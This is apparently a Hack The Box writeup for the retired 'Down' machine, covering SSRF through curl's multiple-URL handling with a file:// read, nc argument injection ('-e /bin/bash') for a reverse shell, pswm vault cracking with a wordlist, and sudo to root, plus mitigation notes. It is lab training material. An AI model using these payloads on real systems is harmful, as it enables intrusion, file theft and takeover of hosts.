---
machine: Down
os: Linux
difficulty: Easy
platform: Hack The Box
state: Retired
tags: [linux, web, ssrf, curl, parameter-injection, pswm, privesc]
---

# Down — Hack The Box (Linux)

[🇪🇸 Español](README.md) | **English**

> **State:** Retired. Reference writeup; no real flags or credentials.

## TL;DR

The site checks whether a URL is up and is SSRF-vulnerable. `curl` accepts multiple URLs, so a second `file://` reads host files; the source reveals an expert mode using `nc` that allows parameter injection for `www-data`. `aleks`'s `pswm` vault is decrypted with a wordlist, and `aleks` can run any command as root.

## Recon

```bash
nmap -Pn -sCV -p22,80 <IP>
```

- `22` SSH and `80` Apache with `down.htb`.
- The app takes a URL and reports whether it responds.
- `feroxbuster` finds `index.php` and `url`/`expertmode` parameters.

## Enumeration

The `url` parameter is passed to `curl`. The filter blocks `file://`, but `curl` accepts multiple URLs in one call; add a second one with the `file://` scheme and read source.

```text
url=http://<ATTACKER>/ &url=file:///var/www/html/index.php
```

The source shows `?expertmode=tcp`, which runs `/usr/bin/nc -vz $ip $port`.

## Foothold

The `ip` field only validates an IP, but `port` is concatenated. Inject an `nc` option to run a reverse shell.

```bash
curl -X POST 'http://down.htb/index.php?expertmode=tcp' \
  --data-urlencode 'ip=127.0.0.1' --data-urlencode 'port=1 -e /bin/bash'
```

## Lateral movement

`/home/aleks/.local/share/pswm/pswm` is a `pswm` vault. Copy it and try the wordlist; `pswm-decryptor` recovers `aleks`'s password, which works over SSH.

```bash
python3 pswm-decrypt.py -f pswm -w rockyou.txt
ssh aleks@down.htb
```

## Privilege escalation

`aleks` can run any command as any user.

```bash
sudo -i
```

## Evidence

- SSRF with multiple URLs and `file://`.
- Source and expert mode.
- `nc` parameter injection.
- `pswm` vault and `aleks`.
- Full sudo rule and root.

## Lessons learned

- SSRF can bypass filters with alternate schemes.
- Multiple URLs in `curl` widen the surface.
- `escapeshellcmd` does not prevent argument injection.
- Local password vaults are dictionary targets.

## Mitigation and detection

- Validate URLs with an allowlist and resolve DNS once.
- Do not pass input to `curl`/`nc`; use APIs and `escapeshellarg`.
- Encrypt vaults with strong passwords.
- Limit sudo to specific commands.

## References

- [0xdf — Down](https://0xdf.gitlab.io/2025/06/17/htb-down.html)
- [IppSec — Down](https://www.youtube.com/watch?v=mi_t2Nz8dPk)
- [Hack The Box — Down](https://app.hackthebox.com/machines/down)
